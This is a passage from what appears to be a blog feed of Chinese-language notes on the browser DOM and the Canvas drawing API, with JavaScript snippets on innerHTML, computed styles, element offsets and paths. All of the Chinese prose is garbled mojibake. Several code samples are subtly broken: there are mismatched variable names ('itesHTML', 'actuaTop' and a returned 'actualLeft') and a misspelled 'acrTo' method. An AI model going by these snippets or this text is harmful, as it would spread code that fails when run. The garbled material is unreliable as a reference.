çš„æ‰€æœ‰äº‹ä»¶ç¨‹åºå’Œjså¯¹è±¡å±æ€§ã€‚è®¾ç½®innerHTMLæˆ–outerHTMLæ—¶ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªHTMLè§£æå™¨ã€‚ä¸å¯é¿å…åœ°ï¼Œåˆ›å»ºå’Œé”€æ¯HTMLè§£æå™¨ä¼šå¸¦æ¥æ€§èƒ½æŸå¤±ã€‚æ‰€ä»¥åœ¨æ’å…¥å¤§é‡æ–°HTMLæ ‡è®°æ—¶ï¼Œå¯ä»¥å…ˆé€šè¿‡å¤šæ¬¡DOMæ“ä½œå†æŒ‡å®šå®ƒä»¬ä¹‹é—´çš„å…³ç³»ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> itemsHtml = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  itemsHtml += <span class="string">"&lt;li&gt;"</span> + i + <span class="string">"&lt;/li&gt;"</span></span><br><span class="line">&#125;</span><br><span class="line">ul.innerHTML = itesHTML;</span><br></pre></td></tr></table></figure></p><p><br></p><ul><li>æ’å…¥æ–‡æœ¬<br>innerTextå’ŒouteTextä¸æ˜¯HTML5çš„å±æ€§ã€‚ä½†IE4, safari, opera, chromeæ”¯æŒinnerText, firefoxè™½ç„¶ä¸æ”¯æŒï¼Œä½†æ”¯æŒä½œç”¨ç±»ä¼¼çš„textContentã€‚</li></ul><p><br></p><ul><li>æ»šåŠ¨<br>scrollIntoView()<br>é€šè¿‡æ»šåŠ¨æµè§ˆå™¨çª—å£æˆ–æŸä¸ªå®¹å™¨å…ƒç´ ï¼Œè°ƒç”¨å…ƒç´ å¯ä»¥å‡ºç°åœ¨è§†å£ä¸­ã€‚<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.form[<span class="number">0</span>].scrollIntoView()</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h3 id="6-2-DOM2å’ŒDOM3"><a href="#6-2-DOM2å’ŒDOM3" class="headerlink" title="6.2 DOM2å’ŒDOM3"></a>6.2 DOM2å’ŒDOM3</h3><h4 id="6-1-style"><a href="#6-1-style" class="headerlink" title="6.1 style"></a>6.1 style</h4><p>è¡Œå†…styleå¯¹è±¡ï¼ŒåŒ…å«ç€é€šè¿‡HTMLçš„styleç‰¹æ€§æŒ‡å®šçš„æ‰€æœ‰æ ·å¼ä¿¡æ¯ï¼Œä½†ä¸åŒ…å«ä¸å¤–éƒ¨æ ·å¼è¡¨æˆ–åµŒå…¥æ ·å¼è¡¨å±‚å è€Œæ¥çš„æ ·å¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">"id"</span>);</span><br><span class="line">div.style.backgroundColor = <span class="string">"red"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¿é—®styleç‰¹æ€§ä¸­çš„CSSä»£ç </span></span><br><span class="line">div.style.cssText = <span class="string">"width: 25px; height: 100px; background-color: green"</span>;</span><br><span class="line">div.style.length</span><br><span class="line">div.style.getPropertyValue(propertyName)</span><br><span class="line">div.style.setProperty(propertyName, value, priority)</span><br><span class="line">div.style.removeProperty(propertyName)</span><br><span class="line">div.style.item(index)  <span class="comment">// è¿”å›ç»™å®šä½ç½®çš„CSSå±æ€§çš„åç§°</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-getComputedStyle"><a href="#6-2-getComputedStyle" class="headerlink" title="6.2 getComputedStyle"></a>6.2 getComputedStyle</h4><p>getComputedStyle()æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šè¦è®¡ç®—æ ·å¼çš„å…ƒç´ å’Œä¸€ä¸ªä¼ªå…ƒç´ å­—ç¬¦ä¸²(:after, å¯ä»¥æ˜¯null)ã€‚è¿”å›ä¸€ä¸ªCSSStyleDeclarationå¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«å½“å‰å…ƒç´ çš„æ‰€æœ‰è®¡ç®—çš„æ ·å¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myDiv = <span class="built_in">document</span>.getElementById(<span class="string">'myDiv'</span>);</span><br><span class="line"><span class="keyword">var</span> computedStyle = <span class="built_in">document</span>.defaultView.getComputedStyle(myDiv, <span class="literal">null</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// IEä¸æ”¯æŒgetComputedStyleï¼Œä½†æœ‰ç±»ä¼¼çš„æ–¹æ³•myDiv.currentStyle</span></span><br><span class="line"><span class="comment">// var computedStyle = myDiv.currentStyle;</span></span><br><span class="line">computedStyle.width;</span><br><span class="line">computedStyle.height;</span><br><span class="line">computedStyle.backgroundColor;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-3-CSSStylesSheet"><a href="#6-3-CSSStylesSheet" class="headerlink" title="6.3 CSSStylesSheet"></a>6.3 CSSStylesSheet</h4><p>å‘ç°æœ‰æ ·å¼è¡¨ä¸­æ·»åŠ æ–°è§„åˆ™<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertRule</span>(<span class="params">sheet, selectorText, cssText, position</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (sheet.insertRule)&#123;</span><br><span class="line">    sheet.insertRule(selectorText + <span class="string">"&#123;"</span> + cssText + <span class="string">"&#125;"</span>, position);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sheet.addRule)&#123;</span><br><span class="line">    sheet.addRule(selectorText, cssText, position);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">insertRule(<span class="built_in">document</span>.styleSheets[<span class="number">0</span>], <span class="string">"body"</span>, <span class="string">"background-color: silver"</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p>å‘ç°åœ¨æ ·å¼è¡¨åˆ é™¤è§„åˆ™<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteRule</span>(<span class="params">sheet, index</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (sheet.deleteRule)&#123;</span><br><span class="line">    sheet.deleteRule(index);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sheet.removeRule)&#123;</span><br><span class="line">    sheet.removeRule(index);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">deleteRule(<span class="built_in">document</span>.styleSheets[<span class="number">0</span>], <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-4-offsetHeight-clientHeight-scrollHeight"><a href="#6-4-offsetHeight-clientHeight-scrollHeight" class="headerlink" title="6.4 offsetHeight, clientHeight, scrollHeight"></a>6.4 offsetHeight, clientHeight, scrollHeight</h4><p><em>offsetHeight</em><br>é€šè¿‡ä¸‹åˆ—4ä¸ªå±æ€§è·å–å…ƒç´ çš„åç§»é‡: offsetHeight, offsetWidth, offsetLeft, offsetTopã€‚è¦æƒ³çŸ¥é“æŸä¸ªå…ƒç´ åœ¨é¡µé¢ä¸Šçš„åç§»é‡ï¼Œå°†è¿™ä¸ªå…ƒç´ çš„offsetLeftå’ŒoffsetTopä¸å…¶offsetParentçš„ç›¸åŒå±æ€§ç›¸åŠ ï¼Œå¦‚æ­¤å¾ªç¯ç›´è‡³æ ¹å…ƒç´ ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªåŸºæœ¬å‡†ç¡®çš„å€¼ã€‚<br><img src="/2018/10/07/DOM/3.png" style="max-width:350px; margin-top:20px"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElementTop</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> actuaTop = element.offsetTop;</span><br><span class="line">  <span class="keyword">var</span> current = element.offsetParent;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>( current !== <span class="literal">null</span> )&#123;</span><br><span class="line">    actualTop += current.offsetTop;</span><br><span class="line">    current = current.offsetParent;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> actualLeft;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br><br><em>clientHeight</em><br>å…ƒç´ å†…å®¹åŠå…¶å†…è¾¹è·æ‰€å æ®çš„ç©ºé—´å¤§å°: clientWidth å’Œ clientHeightã€‚æœ€å¸¸ç”¨åˆ°çš„æ˜¯ï¼Œç¡®å®šæµè§ˆå™¨è§†å£å¤§å°ï¼Œå¯ä»¥ä½¿ç”¨document.documentElement æˆ– document.body çš„ clientWidth å’Œ clientHeightã€‚<br><img src="/2018/10/07/DOM/4.png" style="max-width:350px; margin-top:20px"><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.clientWidth || <span class="built_in">document</span>.documentElement.clientWidth</span><br></pre></td></tr></table></figure></p><p><br><br><em>scrollHeight</em><br>scrollHeight: å…ƒç´ å†…å®¹çš„æ€»é«˜åº¦<br>scrollWidth: å…ƒç´ å†…å®¹çš„æ€»å®½åº¦<br>scrollLeft: è¢«éšè—åœ¨å†…å®¹åŒºåŸŸå·¦ä¾§çš„åƒç´ æ•°ï¼Œè®¾ç½®è¿™ä¸ªå±æ€§å¯ä»¥æ”¹å˜å…ƒç´ çš„æ»šåŠ¨ä½ç½®<br>scrollTop: è¢«éšè—åœ¨å†…å®¹åŒºåŸŸä¸Šæ–¹çš„åƒç´ æ•°ï¼Œ è®¾ç½®è¿™ä¸ªå±æ€§å¯ä»¥æ”¹å˜å…ƒç´ çš„æ»šåŠ¨ä½ç½®<br><img src="/2018/10/07/DOM/5.png" style="max-width:350px; margin-top: 20px"></p><p>åœ¨ç¡®å®šæ–‡æ¡£çš„æ€»é«˜åº¦æ—¶ï¼Œå¿…é¡»å–å¾— scrollWidth/clientWidth å’Œ scrollHeight/clientHeight ä¸­çš„æœ€å¤§å€¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–‡æ¡£æ€»é«˜åº¦</span></span><br><span class="line"><span class="keyword">var</span> docHeight = <span class="built_in">Math</span>.max(<span class="built_in">document</span>.documentElement.scrollHeight, <span class="built_in">document</span>.documentElement.clientHeight);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-5-getBoundingClientRect"><a href="#6-5-getBoundingClientRect" class="headerlink" title="6.5 getBoundingClientRect"></a>6.5 getBoundingClientRect</h4><p>ç»™å‡ºäº†å…ƒç´ åœ¨é¡µé¢ä¸­ç›¸å¯¹è§†å£çš„ä½ç½®ï¼ŒåŒ…å«4ä¸ªå±æ€§: left, top, right, bottomã€‚<code>-scrollTop</code>æ˜¯ä¸ºäº†é˜²æ­¢è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶çª—å£è¢«æ»šåŠ¨äº†ã€‚</p><p>å¦‚æœä¸æ”¯æŒ<code>getBoundingClientRect()</code>æ–¹æ³•ï¼Œå°±ä½¿ç”¨<code>offsetHeight</code>ä¸€å±‚å±‚è®¡ç®—ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBoundingClientRect</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">arguments</span>.callee.offset != <span class="string">"number"</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> scrollTop = <span class="built_in">document</span>.documentElement.scrollTop;</span><br><span class="line">    <span class="keyword">var</span> temp = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">    temp.style.cssText = <span class="string">"position:absolute;left:0;top:0;"</span>; <span class="built_in">document</span>.body.appendChild(temp);</span><br><span class="line">    <span class="built_in">arguments</span>.callee.offset = -temp.getBoundingClientRect().top - scrollTop; <span class="built_in">document</span>.body.removeChild(temp);</span><br><span class="line">    temp = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> rect = element.getBoundingClientRect();</span><br><span class="line">  <span class="keyword">var</span> offset = <span class="built_in">arguments</span>.callee.offset;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">      left: rect.left + offset,</span><br><span class="line">      right: rect.right + offset,</span><br><span class="line">      top: rect.top + offset,</span><br><span class="line">      bottom: rect.bottom + offset</span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Canvaså®ç°ç™½æ¿åŠŸèƒ½</title>
      <link href="/2018/10/06/Canvas%E6%96%87%E6%A1%A3/"/>
      <url>/2018/10/06/Canvas%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-å…ƒç´ "><a href="#1-å…ƒç´ " class="headerlink" title="1. å…ƒç´ "></a>1. å…ƒç´ </h3><ul><li><p>canvaså…ƒç´ <br>canvasæ˜¯ä¸€ä¸ªå¯ä»¥ä½¿ç”¨JSæ¥ç»˜åˆ¶å›¾å½¢çš„HTMLå…ƒç´ ã€‚canvasæ ‡ç­¾åªæœ‰ä¸¤ä¸ªå±æ€§â€”â€”widthå’Œheightã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas id=<span class="string">"tutorial"</span> width=<span class="string">"150"</span> height=<span class="string">"150"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>æ¸²æŸ“ä¸Šä¸‹æ–‡<br>canvaså…ƒç´ åˆ›é€ äº†ä¸€ä¸ªå›ºå®šå¤§å°çš„ç”»å¸ƒï¼Œå®ƒå…¬å¼€äº†ä¸€ä¸ªæˆ–å¤šä¸ªæ¸²æŸ“ä¸Šä¸‹æ–‡ï¼Œç”¨æ¥ç»˜åˆ¶å’Œå¤„ç†è¦å±•ç¤ºçš„å†…å®¹ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">'tutorial'</span>);</span><br><span class="line"><span class="keyword">var</span> ctx    = canvas.getContext(<span class="string">'2d'</span>);</span><br></pre></td></tr></table></figure></li><li><p>åæ ‡<br>ç”»å¸ƒçš„èµ·ç‚¹ä¸ºå·¦ä¸Šè§’(åæ ‡(0, 0))ï¼Œæ‰€æœ‰å…ƒç´ çš„ä½ç½®éƒ½ç›¸å¯¹äºåŸç‚¹å®šä½ã€‚<br><img src="/2018/10/06/Canvasæ–‡æ¡£/1.png" style="padding-top:20px; max-width: 380px"><br><br></p></li></ul><h3 id="2-ç»˜åˆ¶"><a href="#2-ç»˜åˆ¶" class="headerlink" title="2. ç»˜åˆ¶"></a>2. ç»˜åˆ¶</h3><h4 id="2-1-çŸ©å½¢"><a href="#2-1-çŸ©å½¢" class="headerlink" title="2.1 çŸ©å½¢"></a>2.1 çŸ©å½¢</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctx.fillRect(x, y, width, height)     ç»˜åˆ¶ä¸€ä¸ªå¡«å……çš„çŸ©å½¢</span><br><span class="line">ctx.strokeRect(x, y, width, height)   ç»˜åˆ¶ä¸€ä¸ªçŸ©å½¢çš„è¾¹æ¡†</span><br><span class="line">ctx.clearRect(x, y, width, height)    æ¸…é™¤æŒ‡å®šçŸ©å½¢åŒºåŸŸï¼Œè®©æ¸…é™¤éƒ¨åˆ†å®Œå…¨é€æ˜</span><br></pre></td></tr></table></figure><h4 id="2-2-åœ†å¼§"><a href="#2-2-åœ†å¼§" class="headerlink" title="2.2 åœ†å¼§"></a>2.2 åœ†å¼§</h4><p>ç”»ä¸€ä¸ªä»¥(x,y)ä¸ºåœ†å¿ƒçš„radiusä¸ºåŠå¾„çš„åœ†ï¼Œä»startAngleå¼€å§‹åˆ°endAngleç»“æŸï¼ŒæŒ‰ç…§anticlockwiseç»™å®šçš„æ–¹å‘(é»˜è®¤é¡ºæ—¶é’ˆ)ç”Ÿæˆã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.arc(x, y, radius, startAngle, endAngle, anticlockwise)</span><br></pre></td></tr></table></figure></p><p>æ ¹æ®ç»™å®šçš„æ§åˆ¶ç‚¹å’ŒåŠå¾„ç”»ä¸€æ®µåœ†å¼§ï¼Œå†ä»¥ç›´çº¿è¿æ¥ä¸¤ä¸ªæ§åˆ¶ç‚¹ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.acrTo(x1, y1, x2, y2, radius)</span><br></pre></td></tr></table></figure></p><h4 id="2-3-è·¯å¾„"><a href="#2-3-è·¯å¾„" class="headerlink" title="2.3 è·¯å¾„"></a>2.3 è·¯å¾„</h4><p>è·¯å¾„æ˜¯é€šè¿‡ä¸åŒé¢œè‰²å’Œå®½åº¦çš„çº¿æ®µ/æ›²çº¿ç›¸è¿å½¢æˆçš„ä¸åŒå½¢çŠ¶çš„åº—çš„é›†åˆã€‚ç»˜åˆ¶å›¾å½¢çš„æ­¥éª¤ï¼šâ‘ åˆ›å»ºè·¯å¾„èµ·ç‚¹ï¼›â‘¡ä½¿ç”¨ç”»å›¾å‘½ä»¤ç”»å‡ºè·¯å¾„ï¼›â‘¢å°é—­è·¯å¾„ï¼›â‘£é€šè¿‡æè¾¹æˆ–å¡«å……è·¯å¾„æ¥æ¸²æŸ“å›¾å½¢ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctx.beginPath()   æ–°å»ºè·¯å¾„</span><br><span class="line">ctx.moveTo(x,y)   å°†ç¬”è§¦ç§»åŠ¨åˆ°(x,y)ä¸Š</span><br><span class="line">ctx.lineTo(x,y)   ç»˜åˆ¶ä¸€æ¡ä»å½“å‰ä½ç½®åˆ°(x,y)çš„ç›´çº¿</span><br><span class="line">ctx.closePath()   é—­åˆè·¯å¾„</span><br><span class="line">ctx.stroke()      ç»˜åˆ¶è·¯å¾„</span><br><span class="line">ctx.fill()        å¡«å……è·¯å¾„</span><br></pre></td></tr></table></figure></p><h4 id="2-4-è´å¡å°”æ›²çº¿"><a href="#2-4-è´å¡å°”æ›²çº¿" class="headerlink" title="2.4 è´å¡å°”æ›²çº¿"></a>2.4 è´å¡å°”æ›²çº¿</h4><p>äºŒæ¬¡è´å¡å°”æ›²çº¿, cplx,cplyä¸ºä¸€ä¸ªæ§åˆ¶ç‚¹, x,yä¸ºç»“æŸç‚¹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quadraticCurveTo(cplx, cply, x, y)</span><br></pre></td></tr></table></figure></p><p>ä¸‰æ¬¡è´å¡å°”æ›²çº¿, cplx,cplyä¸ºæ§åˆ¶ç‚¹1, cp2x,cp2yä¸ºæ§åˆ¶ç‚¹2, x,yä¸ºç»“æŸç‚¹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bezierCurveTo(cplx, cply, cp2x, cp2y, x, y)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/10/06/Canvasæ–‡æ¡£/2.png" style="padding-top:20px; max-width: 380px"><br><br></p><h3 id="3-ä½¿ç”¨æ ·å¼å’Œé¢œè‰²"><a href="#3-ä½¿ç”¨æ ·å¼å’Œé¢œè‰²" class="headerlink" title="3. ä½¿ç”¨æ ·å¼å’Œé¢œè‰²"></a>3. ä½¿ç”¨æ ·å¼å’Œé¢œè‰²</h3><h4 id="3-1-æè¾¹ï¼Œå¡«å……"><a href="#3-1-æè¾¹ï¼Œå¡«å……" class="headerlink" title="3.1 æè¾¹ï¼Œå¡«å……"></a>3.1 æè¾¹ï¼Œå¡«å……</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ctx.fillStyle = color               è®¾ç½®å›¾å½¢çš„å¡«å……é¢œè‰²</span><br><span class="line">ctx.strokeStyle = color             è®¾ç½®å›¾å½¢è½®å»“çš„é¢œè‰²</span><br><span class="line">ctx.globalAlpha = transparencyValue è®¾ç½®canvasé‡Œæ‰€æœ‰å›¾å½¢çš„é€æ˜åº¦</span><br><span class="line"></span><br><span class="line"><span class="comment">// çº¿å‹</span></span><br><span class="line">lineWidth = <span class="number">1</span>                       è®¾ç½®çº¿æ¡å®½åº¦      </span><br><span class="line">lineCap = <span class="string">'butt/round/square'</span>       è®¾ç½®çº¿æ¡æœ«ç«¯æ ·å¼</span><br><span class="line">lineJoin = <span class="string">'round/bevel/miter'</span>      è®¾å®šçº¿æ¡ä¸çº¿æ¡é—´æ¥åˆå¤„çš„æ ·å¼</span><br><span class="line">miterLimit = <span class="number">1</span>                      é™åˆ¶ä¸¤æ¡çº¿ç›¸äº¤æ—¶äº¤æ¥å¤„æœ€å¤§é•¿åº¦</span><br><span class="line">getLineDash()                       è¿”å›å½“å‰è™šçº¿æ ·å¼</span><br><span class="line">setLineDash([<span class="number">4</span>, <span class="number">2</span>])                 è®¾ç½®å½“å‰è™šçº¿æ ·å¼ï¼Œæ¥å—ä¸€ä¸ªæ•°ç»„æ¥æŒ‡å®šçº¿æ®µä¸é—´éš™çš„äº¤æ›¿</span><br><span class="line">lineDashOffset = value              è®¾ç½®è™šçº¿æ ·å¼çš„èµ·å§‹åç§»é‡</span><br></pre></td></tr></table></figure><h4 id="3-2-æ¸å˜"><a href="#3-2-æ¸å˜" class="headerlink" title="3.2 æ¸å˜"></a>3.2 æ¸å˜</h4><p>æˆ‘ä»¬å¯ä»¥ç”¨çº¿æ€§æˆ–å¾„å‘çš„æ¸å˜æ¥å¡«å……æˆ–æè¾¹ã€‚æ–°å»ºä¸€ä¸ª<code>canvasGradient</code>å¯¹è±¡ï¼Œå¹¶ä¸”èµ‹ç»™<code>fillStyleæˆ–strokeStyle</code>å±æ€§ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºcanvasGradientå¯¹è±¡</span></span><br><span class="line"><span class="keyword">var</span> lineargradient = ctx.createLinearGradient(x1, y1, x2, y2);</span><br><span class="line"><span class="keyword">var</span> radialgradient = ctx.createRadialGradient(x1, y1, r1, x2, y2, r2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ·»åŠ ä»»æ„å¤šä¸ªè‰²æ ‡</span></span><br><span class="line">lineargradient.addColorStop(<span class="number">0</span>, <span class="string">'#000'</span>);</span><br><span class="line">lineargradient.addColorStop(<span class="number">1</span>, <span class="string">'#fff'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// assign gradients to fill and stroke styles</span></span><br><span class="line">ctx.fillStyle = lineargradient;</span><br><span class="line">ctx.strokeStyle = lineargradient;</span><br><span class="line"></span><br><span class="line"><span class="comment">// draw shapes</span></span><br></pre></td></tr></table></figure></p><h4 id="3-3-å›¾æ¡ˆæ ·å¼"><a href="#3-3-å›¾æ¡ˆæ ·å¼" class="headerlink" title="3.3 å›¾æ¡ˆæ ·å¼"></a>3.3 å›¾æ¡ˆæ ·å¼</h4><p>å›¾æ¡ˆçš„åº”ç”¨å’Œæ¸å˜å¾ˆåƒï¼Œåˆ›å»ºå‡ºä¸€ä¸ªpatternåï¼Œèµ‹ç»™<code>fillStyleæˆ–strokeStyle</code>å±æ€§å³å¯ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">'someimage.png'</span>;</span><br><span class="line"><span class="keyword">var</span> ptrn = ctx.createPattern(img, type)</span><br><span class="line"><span class="comment">// typeå¯é€‰repeat, repeat-x, repeat-y, no-repeat</span></span><br></pre></td></tr></table></figure></p><h4 id="3-4-é˜´å½±"><a href="#3-4-é˜´å½±" class="headerlink" title="3.4 é˜´å½±"></a>3.4 é˜´å½±</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ctx.shadowOffsetX = float   è®¾å®šé˜´å½±åœ¨Xè½´çš„å»¶ä¼¸è·ç¦»</span><br><span class="line">ctx.shadowOffsetY = float   è®¾å®šé˜´å½±åœ¨Yè½´çš„å»¶ä¼¸è·ç¦»</span><br><span class="line">ctx.shadowBlur    = float   è®¾å®šé˜´å½±çš„æ¨¡ç³Šç¨‹åº¦</span><br><span class="line">ctx.shadowColor   = color   è®¾å®šé˜´å½±é¢œè‰²</span><br><span class="line">ctx.font = <span class="string">'123'</span>;</span><br><span class="line">ctx.fillStyle = <span class="string">'#000'</span>;</span><br><span class="line">ctx.fillText(<span class="string">'Sample String'</span>, <span class="number">5</span>, <span class="number">30</span>);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-æ–‡æœ¬å’Œå›¾ç‰‡"><a href="#4-æ–‡æœ¬å’Œå›¾ç‰‡" class="headerlink" title="4. æ–‡æœ¬å’Œå›¾ç‰‡"></a>4. æ–‡æœ¬å’Œå›¾ç‰‡</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctx.font = <span class="string">'10px sans-serif'</span>;</span><br><span class="line">ctx.textAlign = <span class="string">'start/end/left/right/center'</span>;</span><br><span class="line">ctx.textBaseline = <span class="string">'top/hanging/middle/alphabetic/ideographic/bottom'</span>;</span><br><span class="line">ctx.direction = <span class="string">'ltr/rtl/inherit'</span>;</span><br><span class="line"></span><br><span class="line">ctx.fillText(text, x, y, maxWdith)    åœ¨æŒ‡å®šçš„(x,y)ä½ç½®å¡«å……æŒ‡å®šæ–‡æœ¬ï¼Œç»˜åˆ¶çš„æœ€å¤§å®½åº¦å¯é€‰</span><br><span class="line">ctx.strokeText(text, x, y, maxWidth)  